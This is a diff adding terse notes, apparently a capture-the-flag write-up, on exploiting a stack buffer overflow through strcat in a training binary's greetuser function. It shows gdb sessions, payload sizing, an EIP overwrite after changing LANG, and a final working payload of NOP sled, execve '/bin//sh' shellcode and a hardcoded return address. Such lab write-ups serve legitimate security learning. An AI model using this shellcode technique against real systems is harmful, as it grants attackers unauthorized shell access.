@@ -1,0 +1,38 @@
+strncpy is protected, but strcat is not
+
+
+b*0x08048528 (ret on greetuser)
+
+run "$(python -c 'print "A" * 40')" "$(python -c 'print "B" * 32')"
+
+info registers
+si
+eip            0x8004242
+
+Eip is partially overwrited, we cannot overflow more becaues we got
+
+A*40 + B*32 + "Hello " = 78
+
+0-72 = BUFFER
+72-76 = EBP
+76-78 = EIP
+
+we just need to change language to 1 or 2 so that our string is longer
+We can change env variable 'language' to gain more space
+
+export LANG=nl
+(gdb) run "$(python -c 'print "A" * 40')" "$(python -c 'print "B" * 32')"
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+#	unset env LINES; unset env COLUMNS => This line is needed because sometime
+	the stack is not the same because of env variable in GDB
+
+#	Unix set environment variable before local
+#	/proc/sys/kernel/randomize_va_space
+#	https://russtone.io/2016/07/31/test-exploits-under-gdb/
+
+Oh.., i decided to jump back to the buffer himself with a shellcode
+
+"$(python -c 'print "\x90" * 12 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')" "$(python -c 'print "B" * 23 + "\xcd\xf5\xff\xbf"')"
+
